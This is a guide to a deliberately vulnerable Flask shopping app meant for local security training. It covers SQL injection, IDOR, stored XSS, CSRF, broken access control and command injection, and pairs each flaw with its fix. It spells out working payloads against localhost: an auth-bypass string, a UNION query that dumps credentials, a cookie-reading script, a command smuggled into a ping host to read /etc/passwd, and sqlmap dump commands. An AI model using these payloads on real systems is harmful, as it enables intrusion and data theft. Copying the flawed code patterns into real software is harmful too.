# ShopEase — Vulnerability Guide

**For authorized security testing / learning only. Run locally. Never deploy publicly or use real data.**

5 pages, each wired with realistic, exploitable flaws — web UI and a matching JSON API for every one, so you can practice with a browser, curl, Postman, Burp Suite, or sqlmap.

Run it:
```
pip install flask
python3 app.py
```
Then open `http://127.0.0.1:5000`. The DB is reseeded every time you start the app.

Demo accounts: `alice/alice123`, `bob/bobpass`, `admin/admin!2024`

---

## Page 1 — Login (`/login`, `/api/login`)
**SQL Injection (authentication bypass) — CWE-89**
Query is built with an f-string: `f"SELECT * FROM users WHERE username = '{username}' AND password = '{password}'"`

- Browser: username = `admin' --` , password = anything
- API:
  ```
  curl -X POST http://127.0.0.1:5000/api/login -H "Content-Type: application/json" \
    -d '{"username":"admin'"'"' --","password":"x"}'
  ```
- Also leaks: plaintext passwords and SSNs in the JSON response, and raw DB error text on malformed input.
- **Fix:** parameterized queries (`?` placeholders), hash passwords (bcrypt/argon2), generic error messages.

## Page 2 — Product search (`/products`, `/api/products`)
**SQL Injection (UNION-based data exfiltration) — CWE-89**
`q` is inserted directly into a `LIKE '%...%'` clause.

```
curl "http://127.0.0.1:5000/api/products?q=%27%20UNION%20SELECT%20id,username,password,email%20FROM%20users--"
```
This dumps every username/password/email through a product search box. Also testable with `sqlmap -u "http://127.0.0.1:5000/api/products?q=test"`.
- **Fix:** parameterized queries; never build SQL via string formatting.

## Page 3 — Profile (`/profile/<id>`, `/api/profile/<id>`)
**IDOR (Insecure Direct Object Reference) — CWE-639**
No check that the logged-in user matches the requested `id`. Anyone can enumerate `/api/profile/1`, `/2`, `/3` ... and get full records including SSNs, with zero authentication required at all on the API route.
- **Fix:** verify `session['user_id'] == user_id` (or admin role) before returning data; never expose SSNs in a product API anyway.

## Page 4 — Product detail & comments (`/product/<id>`)
**Stored XSS — CWE-79** and **missing CSRF protection — CWE-352**
Comment body is rendered with `|safe`, so HTML/JS in a posted comment executes for every later visitor.

```
curl -X POST http://127.0.0.1:5000/product/1 -d 'author=tester&body=<script>alert(document.cookie)</script>'
```
Then visit `/product/1` — the script fires. The comment form also has no CSRF token, so a malicious page can auto-submit it on a logged-in victim's behalf.
- **Fix:** auto-escape output (drop `|safe`), sanitize/allowlist HTML if rich text is needed, add CSRF tokens (Flask-WTF) on all state-changing forms.

## Page 5 — Admin panel (`/admin`, `/api/admin/ping`, `/api/admin/users`)
**Broken access control — CWE-284/862** and **OS command injection — CWE-78**
- `/admin` "checks" a client-supplied `is_admin` cookie instead of server-side session role, and defaults to allow when the cookie is absent. Just visit it, or set `is_admin=1` in devtools.
- `/api/admin/users` has no auth check whatsoever.
- `/api/admin/ping` shells out with `subprocess.check_output(f"ping -c 1 {host}", shell=True)`:
  ```
  curl -X POST http://127.0.0.1:5000/api/admin/ping -H "Content-Type: application/json" \
    -d '{"host":"127.0.0.1; cat /etc/passwd"}'
  ```
- **Fix:** enforce role checks server-side from `session`, never trust client cookies for authorization; avoid `shell=True`, use `subprocess.run([...], shell=False)` with a validated, allowlisted host argument (or just use a Python ICMP library).

---

## Also present throughout
- Hardcoded Flask `secret_key` (CWE-798) — session cookies can be forged if the key is known.
- `debug=True` in production-style run (CWE-489) — exposes the Werkzeug interactive debugger, which is itself an RCE vector.
- Plaintext password storage (CWE-256).
- Verbose error messages leaking SQL/stack details (CWE-209).
- Sensitive data (SSNs) returned in several unrelated API responses (CWE-359).

## Suggested testing workflow
1. **Manual / Burp Repeater:** walk all 5 pages first as a normal user, then intercept and tamper with each request (login, search `q`, profile id, comment body, admin cookie, ping host).
2. **sqlmap:** `sqlmap -u "http://127.0.0.1:5000/api/products?q=test" --batch --dump`
3. **ZAP active scan:** point at `http://127.0.0.1:5000` and run a full active scan — it should flag SQLi, XSS, and missing CSRF automatically.
4. **Postman/curl collection:** script the exploit requests above into a collection to regression-test fixes.
